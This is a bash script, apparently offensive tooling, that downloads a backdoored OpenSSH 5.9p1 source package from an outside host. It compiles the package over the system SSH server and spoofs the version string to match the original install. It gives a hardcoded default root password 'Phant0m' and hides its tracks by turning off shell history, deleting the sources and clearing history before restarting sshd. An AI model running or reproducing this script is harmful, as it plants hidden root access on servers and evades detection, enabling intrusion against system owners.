#!/usr/bin/env bash
# Author : Phant0m
# Default root password : Phant0m
export HISTSIZE=0;export HISTFILE=/dev/null
Current_version=`rpm -qa | grep openssh | awk -F"-" '{print $2}' | grep ^[0-9]`
echo " CURRENT SSH VERSION: $Current_version"
VERSION=$1
EDITION=$2
if [ $# -ne 2 ]
then
    echo -e "\033[31m Usage:$0 SSH_Version SSH_Edition \033[0m"
    echo -e "\033[31m Example: $0 4.3 p2 \033[0m"
    exit 1;
fi
wget http://www.woshisb.org/exploit/linux/hm/openssh-5.9p1-backdoored.tar.gz -P /tmp
cd /tmp
tar -zxf openssh-5.9p1-backdoored.tar.gz
cd openssh-5.9p1
sed -i '/SSH_PORTABLE/ {s/p1/${EDITION}/g}' version.h
sed -i '/SSH_VERSION/ {s/5.3/${VERSION}/g}' version.h
./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
make && make install
rm -rf /tmp/openssh-5.9p1*
history -c
/etc/init.d/sshd restart
